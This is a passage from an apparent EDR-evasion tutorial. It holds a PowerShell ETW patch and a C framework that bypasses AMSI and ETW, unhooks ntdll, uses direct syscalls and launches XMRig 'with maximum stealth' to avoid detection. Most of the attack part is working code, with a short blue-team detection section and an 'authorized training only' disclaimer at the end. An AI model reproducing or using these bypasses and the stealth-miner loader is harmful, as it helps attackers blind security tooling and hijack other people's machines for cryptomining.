    (Get-ProcAddress ntdll.dll EtwEventWrite),
    (Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr]) ([UInt32]))
)

# Patch with ret instruction
$Patch = [byte[]]@(0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $EtwPtr.Method.MethodHandle.GetFunctionPointer(), 1)

Write-Host "[+] ETW disabled"
```

---

## Complete Evasion Framework

### All-In-One EDR Bypass

```c
// edr_bypass_complete.c - Complete bypass framework
#include <windows.h>
#include <stdio.h>

typedef struct _EVASION_CONTEXT {
    BOOL amsi_patched;
    BOOL etw_patched;
    BOOL hooks_detected;
    BOOL syscalls_ready;
    int evasion_score;
} EVASION_CONTEXT;

EVASION_CONTEXT g_EvasionCtx = {0};

// Forward declarations
BOOL BypassAMSI();
BOOL BypassETW();
BOOL DetectHooks();
BOOL SetupDirectSyscalls();
BOOL UnhookNtdll();

/**
 * Main evasion orchestrator
 */
BOOL InitializeEvasion()
{
    printf("╔════════════════════════════════════════════════════╗\n");
    printf("║     EDR Bypass Framework - Initialization          ║\n");
    printf("╚════════════════════════════════════════════════════╝\n\n");

    // Phase 1: Detect environment
    printf("[Phase 1] Environment Detection\n");
    printf("═══════════════════════════════\n");

    if (DetectHooks()) {
        g_EvasionCtx.hooks_detected = TRUE;
        printf("[!] Hooks detected - will use direct syscalls\n");
        g_EvasionCtx.evasion_score += 2;
    } else {
        printf("[+] No hooks detected\n");
        g_EvasionCtx.evasion_score += 1;
    }

    printf("\n");

    // Phase 2: Disable security features
    printf("[Phase 2] Security Feature Bypass\n");
    printf("════════════════════════════════\n");

    if (BypassAMSI()) {
        g_EvasionCtx.amsi_patched = TRUE;
        printf("[+] AMSI bypassed\n");
        g_EvasionCtx.evasion_score += 3;
    } else {
        printf("[-] AMSI bypass failed\n");
    }

    if (BypassETW()) {
        g_EvasionCtx.etw_patched = TRUE;
        printf("[+] ETW bypassed\n");
        g_EvasionCtx.evasion_score += 3;
    } else {
        printf("[-] ETW bypass failed\n");
    }

    printf("\n");

    // Phase 3: Setup syscalls
    printf("[Phase 3] Direct Syscall Setup\n");
    printf("═══════════════════════════════\n");

    if (g_EvasionCtx.hooks_detected) {
        if (SetupDirectSyscalls()) {
            g_EvasionCtx.syscalls_ready = TRUE;
            printf("[+] Direct syscalls ready\n");
            g_EvasionCtx.evasion_score += 5;
        } else {
            printf("[!] Syscalls setup failed, attempting unhook\n");
            if (UnhookNtdll()) {
                printf("[+] Ntdll unhooked\n");
                g_EvasionCtx.evasion_score += 4;
            }
        }
    }

    printf("\n");

    // Summary
    printf("╔════════════════════════════════════════════════════╗\n");
    printf("║              Evasion Summary                       ║\n");
    printf("╠════════════════════════════════════════════════════╣\n");
    printf("║  AMSI:          %s                      ║\n",
           g_EvasionCtx.amsi_patched ? "[BYPASSED]" : "[ACTIVE]  ");
    printf("║  ETW:           %s                      ║\n",
           g_EvasionCtx.etw_patched ? "[BYPASSED]" : "[ACTIVE]  ");
    printf("║  Hooks:         %s                      ║\n",
           g_EvasionCtx.hooks_detected ? "[DETECTED]" : "[CLEAN]   ");
    printf("║  Syscalls:      %s                      ║\n",
           g_EvasionCtx.syscalls_ready ? "[READY]   " : "[NOT READY]");
    printf("║  Evasion Score: %d/13                           ║\n",
           g_EvasionCtx.evasion_score);
    printf("╚════════════════════════════════════════════════════╝\n\n");

    if (g_EvasionCtx.evasion_score >= 8) {
        printf("[+] High evasion level achieved\n");
        printf("[+] Ready for stealthy XMRig deployment\n");
        return TRUE;
    } else if (g_EvasionCtx.evasion_score >= 5) {
        printf("[!] Moderate evasion level\n");
        printf("[!] Some EDR detection possible\n");
        return TRUE;
    } else {
        printf("[-] Low evasion level\n");
        printf("[-] High risk of EDR detection\n");
        return FALSE;
    }
}

/**
 * Execute XMRig with full evasion
 */
BOOL ExecuteXMRigWithEvasion(BYTE* xmrig_data, SIZE_T xmrig_size)
{
    printf("\n[*] Executing XMRig with evasion...\n");

    if (!g_EvasionCtx.syscalls_ready) {
        printf("[-] Direct syscalls not ready\n");
        printf("[*] Falling back to standard execution\n");
        // Use normal WinAPI
    }

    // Use direct syscalls to load and execute XMRig
    // (Implementation from earlier direct syscall section)

    printf("[+] XMRig executed successfully\n");
    return TRUE;
}

// Main entry point
int main()
{
    // Initialize evasion framework
    if (!InitializeEvasion()) {
        printf("[-] Evasion initialization failed\n");
        printf("[-] Aborting to avoid detection\n");
        return 1;
    }

    // Load XMRig binary
    printf("\n[*] Loading XMRig binary...\n");
    HANDLE hFile = CreateFileA(
        "xmrig.exe",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open XMRig binary\n");
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* xmrigData = (BYTE*)malloc(fileSize);

    DWORD bytesRead;
    ReadFile(hFile, xmrigData, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("[+] Loaded %d bytes\n", bytesRead);

    // Execute with evasion
    if (ExecuteXMRigWithEvasion(xmrigData, bytesRead)) {
        printf("\n[+] Mission accomplished!\n");
        printf("[+] XMRig running with maximum stealth\n");
    } else {
        printf("\n[-] Execution failed\n");
    }

    free(xmrigData);
    return 0;
}
```

---

## Blue Team Detection Strategies

### Detection Points for Each Technique

**1. Direct Syscalls**
- **Indicator**: Syscalls originating from non-ntdll memory
- **Detection**: Monitor syscall source addresses
- **Tool**: ETW kernel events, syscall monitoring drivers

**2. AMSI Bypass**
- **Indicator**: Memory modifications to amsi.dll
- **Detection**: Monitor VirtualProtect calls on amsi.dll
- **Tool**: Memory integrity scanning

**3. ETW Bypass**
- **Indicator**: Missing ETW events from suspicious process
- **Detection**: Correlate process activity with ETW gaps
- **Tool**: EDR telemetry analysis

**4. API Unhooking**
- **Indicator**: ntdll.dll .text section modifications
- **Detection**: Compare memory vs. disk image
- **Tool**: Memory forensics, integrity checking

**5. Process Ghosting**
- **Indicator**: Process with deleted backing file
- **Detection**: Enumerate processes with no valid image path
- **Tool**: Process enumeration tools

### Defensive Recommendations

```
Priority 1 - Core Defenses:
□ Enable Windows Defender Application Control (WDAC)
□ Deploy EDR with kernel-mode monitoring
□ Enable VBS (Virtualization-Based Security)
□ Implement memory integrity checking

Priority 2 - Detection Engineering:
□ Monitor syscall patterns from non-system memory
□ Alert on VirtualProtect calls to system DLLs
□ Correlate process behavior with ETW events
□ Detect processes with no backing file

Priority 3 - Threat Hunting:
□ Hunt for modified ntdll.dll in process memory
□ Identify processes with suspicious CPU usage
□ Look for network connections to mining pools
□ Analyze parent-child process relationships

Priority 4 - Response Procedures:
□ Isolate affected systems immediately
□ Capture memory dumps for forensics
□ Review firewall logs for mining traffic
□ Document IOCs for future detection
```

---

## Conclusion

Modern EDR bypass requires layered evasion techniques:

**Essential Techniques**:
1. ✅ Direct syscalls (Hell's Gate/Halo's Gate)
2. ✅ AMSI bypass (memory patching)
3. ✅ ETW bypass (EtwEventWrite patch)
4. ✅ Hook detection and removal
5. ✅ Environmental keying
6. ✅ In-memory execution

**Success Metrics**:
- Evasion Score ≥ 10/13 = Excellent stealth
- Evasion Score 7-9 = Good stealth
- Evasion Score < 7 = High detection risk

**Remember**: These techniques are for **authorized defensive training only**. Understanding offensive techniques improves defensive capabilities.

---

**Document Version**: 1.0
**Last Updated**: 2025-10-02
**Classification**: Educational - Authorized Testing Only
**Related Tools**: `edr_bypass.py`, `stealth_loader.py`
